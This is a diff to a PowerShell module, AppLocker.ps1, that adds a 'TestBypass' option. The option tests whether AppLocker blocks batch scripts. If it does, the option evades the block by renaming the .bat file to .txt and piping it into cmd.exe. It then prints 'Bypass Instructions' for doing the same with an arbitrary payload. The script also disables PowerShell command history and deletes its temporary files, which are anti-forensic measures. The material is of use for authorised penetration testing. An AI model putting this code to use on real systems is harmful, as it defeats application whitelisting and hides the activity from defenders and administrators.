@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.5
+   PS cmdlet Dev version: v1.1.5
 
 .DESCRIPTION
    Applocker.ps1 module searchs in pre-defined directorys in %WINDIR%
@@ -32,7 +32,10 @@
    $Env:WINDIR\System32\Tasks\Microsoft\Windows\SyncCenter
 
 .Parameter WhoAmi
-   Accepts arguments: Groups (List available Group Names).
+   Accepts argument: Groups (List available Group Names)
+
+.Parameter TestBat
+   Accepts argument: TestBypass (Test bat exec applocker bypass)
 
 .Parameter FolderRigths
    Accepts permissions: Modify, Write, FullControll, etc.
@@ -47,6 +50,10 @@
 .EXAMPLE
    PS C:\> .\AppLocker.ps1 -WhoAmi Groups
    Enumerate ALL Group Names Available on local machine
+
+.EXAMPLE
+   PS C:\> .\AppLocker.ps1 -TestBat TestBypass
+   Test for AppLocker Batch Script Execution Restriction bypass
 
 .EXAMPLE
    PS C:\> .\AppLocker.ps1 -GroupName "BUILTIN\Users" -FolderRigths "Write"
@@ -79,12 +86,14 @@
    [string]$FolderRigths="Write",
    [string]$GroupName="false",
    [string]$Success="false",
+   [string]$TestBat="false",
    [string]$WhoAmi="false"
 )
 
 
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+$Working_Directory = pwd|Select-Object -ExpandProperty Path
 ## Set default values in case user skip it
 If(-not($FolderRigths) -or $FolderRigths -ieq "false"){
     $FolderRigths = "Write"
@@ -125,6 +134,116 @@ If($WhoAmi -ieq "Groups"){
    Remove-Item -Path "$Env:TMP\Groups.log" -Force
    Start-Sleep -Seconds 1;Write-Host ""
    exit ## Exit @AppLocker
+}
+
+If($TestBat -ieq "TestBypass"){
+
+   <#
+   .SYNOPSIS
+      Author: r00t-3xp10it
+      Helper - Test AppLocker Batch Execution Restrictions bypass
+
+   .DESCRIPTION
+      This Function tests if BATCH scripts are blocked by AppLocker Windows Security
+      and presents the how-to-bypass cmdline to user if the bat execution its locked.
+
+   .NOTES
+      This CmdLet creates $Env:TMP\logfile.txt to check the batch execution status.
+
+   .Parameter TestBat
+      Accepts argument: TestBypass
+
+   .EXAMPLE
+      PS C:\> .\AppLocker.ps1 -TestBat TestBypass
+      Test for AppLocker Batch Script Execution Restrictions
+
+   .OUTPUTS
+      AppLocker – Testing for Bat execution restrictions
+      --------------------------------------------------
+      [i] writting applock.bat to %tmp% folder
+      [i] trying to execute applock.bat script
+      [x] error: failed to execute applock.bat
+      [i] converting applock.bat to applock.txt
+      [i] trying to execute applock.txt text file
+      [+] success: execution restriction bypassed!
+
+      Bypass Instructions
+      -------------------
+      Move-Item -Path "Payload.bat" -Destination "Payload.txt" -Force
+      cmd.exe "cmd.exe /K < Payload.txt"
+   #>
+
+   ## Build Output Table
+   Write-Host "`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+   Write-Host "--------------------------------------------------";Start-Sleep -Seconds 1
+   Write-Host "[i] writting applock.bat to %tmp% folder";Start-Sleep -Seconds 1
+
+   echo "@echo off"|Out-File $Env:TMP\applock.bat -encoding ascii -force
+   echo "date /T > %tmp%\logfile.txt"|Add-Content $Env:TMP\applock.bat -encoding ascii
+
+   Write-Host "[i] trying to execute applock.bat script"
+   Start-Sleep -Seconds 1;&"$Env:TMP\applock.bat"
+
+
+   Clear-Host
+   If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){
+
+      Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+      Write-Host "--------------------------------------------------"
+      Write-Host "[i] writting applock.bat to %tmp% folder"
+      Write-Host "[i] trying to execute applock.bat script"
+      Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black
+
+      Write-Host "[i] converting applock.bat to applock.txt";Start-Sleep -Seconds 1
+      Move-Item -Path "$Env:TMP\applock.bat" -Destination "$Env:TMP\applock.txt" -EA SilentlyContinue -Force
+
+      Write-Host "[i] trying to execute applock.txt text file`n"
+      Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe < %tmp%\applock.txt"
+
+      Clear-Host
+      If(-not(Test-Path -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue)){
+
+         Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+         Write-Host "--------------------------------------------------"
+         Write-Host "[i] writting applock.bat to %tmp% folder"
+         Write-Host "[i] trying to execute applock.bat script"
+         Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[i] converting applock.bat to applock.txt"
+         Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
+         Write-Host "[x] Fail: To bypass Batch AppLocker restrictions!`n" -ForegroundColor Red -BackgroundColor Black
+
+      }Else{
+
+         Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+         Write-Host "--------------------------------------------------"
+         Write-Host "[i] writting applock.bat to %tmp% folder"
+         Write-Host "[i] trying to execute applock.bat script"
+         Write-Host "[x] error: failed to execute applock.bat" -ForegroundColor Red -BackgroundColor Black
+         Write-Host "[i] converting applock.bat to applock.txt"
+         Write-Host "[i] trying to execute applock.txt text file";Start-Sleep -Seconds 2
+         Write-Host "[+] success: execution restriction bypassed!" -ForegroundColor Green
+         Start-Sleep -Seconds 1
+         Write-Host "`nBypass Instructions" -ForegroundColor Green
+         Write-Host "-------------------"
+         Write-Host "Move-Item -Path `"Payload.bat`" -Destination `"Payload.txt`" -Force"
+         Write-Host "cmd.exe `"cmd.exe /K < Payload.txt`"`n"
+
+      }
+
+   }Else{
+
+      Write-Host "`n`n`nAppLocker – Testing for Bat execution restrictions" -ForegroundColor Green
+      Write-Host "--------------------------------------------------"
+      Write-Host "[i] writting applock.bat to %tmp% folder"
+      Write-Host "[i] trying to execute applock.bat script"
+      Write-Host "[+] success: executed! none restrictions found!`n" -ForeGroundColor Green
+   }
+
+   ## Delete ALL artifacts left behind
+   Remove-Item -Path "$Env:TMP\applock.bat" -EA SilentlyContinue -Force
+   Remove-Item -Path "$Env:TMP\applock.txt" -EA SilentlyContinue -Force
+   Remove-Item -Path "$Env:TMP\logfile.txt" -EA SilentlyContinue -Force
+   Write-Host "";exit ## Exit @AppLocker
 }
 
 
